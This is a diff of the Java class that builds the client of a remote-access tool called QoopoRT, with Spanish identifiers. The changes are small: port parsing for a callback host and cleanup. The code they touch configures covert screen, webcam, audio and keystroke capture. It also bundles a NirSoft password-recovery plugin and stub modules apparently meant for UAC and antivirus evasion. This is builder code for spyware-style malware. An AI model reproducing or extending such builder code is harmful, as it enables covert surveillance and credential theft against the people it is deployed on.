@@ -52,7 +52,7 @@ import qooport.utilidades.cifrado.Encriptacion;
 
 public class CrearCliente extends JFrame {
 
-    public static String passCifradoConfig = "LAOSUISNPASD12378ASDLGASDHGAKD";
+    public static String passCifradoConfig = "ALSKJDAO LAJSDOASL DALSKDJAOSIUD ASDA";
     public static String passCifradoCripter = "##$AS;DKALSJD$@#RADASDKHGQIWUEKJDAS";
     private JFileChooser cd = new JFileChooser();
     private JButton btnCrearCliente;
@@ -126,9 +126,9 @@ public class CrearCliente extends JFrame {
         perfilNuevo.agregarParametro("reg_name", nombre);
         perfilNuevo.agregarParametro("tipoConexion", ConexionServer.TCP);
         perfilNuevo.agregarParametro("ssl", "true");
-//        perfilNuevo.agregarParametro("puerto", "4000");
         perfilNuevo.agregarParametro("prefijo", "serv_");
-        perfilNuevo.agregarParametro("dns", "minoip.ddns.net");
+        perfilNuevo.agregarParametro("dns", "minoip.ddns.net:4000");
+        perfilNuevo.agregarParametro("puerto", "4000");
         perfilNuevo.agregarParametro("urlDns", "");
         perfilNuevo.agregarParametro("clave_acceso", panelCifrado.generarClave());
         perfilNuevo.agregarParametro("prog_tareas", "false");
@@ -268,15 +268,11 @@ public class CrearCliente extends JFrame {
             try {
                 this.panelEspiar.getCapturaOfflinePantalla().setSelected((Boolean) p.obtenerParametro("off-escritorio"));
                 this.panelEspiar.getDelayCapturaPantalla().setValue((Integer) p.obtenerParametro("off-escritorio-delay"));
-
                 this.panelEspiar.getCapturaOfflineWebCam().setSelected((Boolean) p.obtenerParametro("off-camara"));
                 this.panelEspiar.getDelayCapturaWebCam().setValue((Integer) p.obtenerParametro("off-camara-delay"));
-
                 this.panelEspiar.getCapturaOfflineAudio().setSelected((Boolean) p.obtenerParametro("off-audio"));
                 this.panelEspiar.getDelayCapturaAudio().setValue((Integer) p.obtenerParametro("off-audio-delay"));
-
                 this.panelEspiar.getCapturaOfflineKeylogger().setSelected((Boolean) p.obtenerParametro("off-keylogger"));
-
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -310,11 +306,15 @@ public class CrearCliente extends JFrame {
 
         perfil.agregarParametro("prefijo", this.panelConexion.getPrefijo().getText());
         perfil.agregarParametro("dns", this.panelConexion.getTxtIpDNS().getText());
+        try {
+            perfil.agregarParametro("puerto", panelConexion.getTxtIpDNS().getText().split(":")[1]);
+        } catch (Exception e) {
+
+        }
         perfil.agregarParametro("urlDns", this.panelConexion.getTxtUrlHosts().getText());
         perfil.agregarParametro("password", panelConexion.getPassword().getText());
         perfil.agregarParametro("tipoConexion", panelConexion.getComboProtocolo().getSelectedIndex());
         perfil.agregarParametro("ssl", String.valueOf(panelConexion.getChkSSL().isSelected()));
-//        perfil.agregarParametro("puerto", panelConexion.getPuerto().getValue().toString());
         perfil.agregarParametro("delay", panelConexion.getTxtDelay().getText());
         perfil.agregarParametro("off-escritorio", this.panelEspiar.getCapturaOfflinePantalla().isSelected());
         perfil.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue());
@@ -733,12 +733,6 @@ public class CrearCliente extends JFrame {
                     }
 
                     if (this.panelPlugins.getAdjuntarPluginsNirsoft().isSelected()) {
-//                        for (String plugin : Global.nombresPluginsNirsoft) {
-//                            Archivo p1 = new Archivo();
-//                            p1.setNombre(plugin + ".exe");
-//                            p1.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/nirsoft/" + plugin + ".rpl"))));
-//                            lstPlugins.add(p1);
-//                        }
                         Archivo p1 = new Archivo();
                         p1.setNombre("QoopoRTPlugNirsoft.jar");
                         p1.setIcono(Compresor.comprimirGZIP(Util.conseguirBytes(QoopoRT.class.getResourceAsStream("/extras/plugins/p4/QoopoRTPlugNirsoft.jar"))));
@@ -814,7 +808,6 @@ public class CrearCliente extends JFrame {
                                     || (entry.getName().contains("rt/modulos/var/COFF.class"))//captura offline
                                     || (entry.getName().contains("rt/modulos/var/UAC.class"))
                                     || (entry.getName().contains("rt/modulos/var/AVM.class"))
-                                    //|| (entry.getName().contains("rt/modulos/CapturaKLOffline.class"))
                                     || (entry.getName().contains("rt/modulos/OPC.class"))
                                     || (entry.getName().contains("rt/RtServer.class"))
                                     || (entry.getName().contains("rt/CONAR.class"))
@@ -892,6 +885,10 @@ public class CrearCliente extends JFrame {
         }
 
         if (clase.contains("BufferPantalla")) {//este buffer ya no se usa
+            return false;
+        }
+
+        if (clase.contains("Pixeles")) {//ya no se usa
             return false;
         }
 
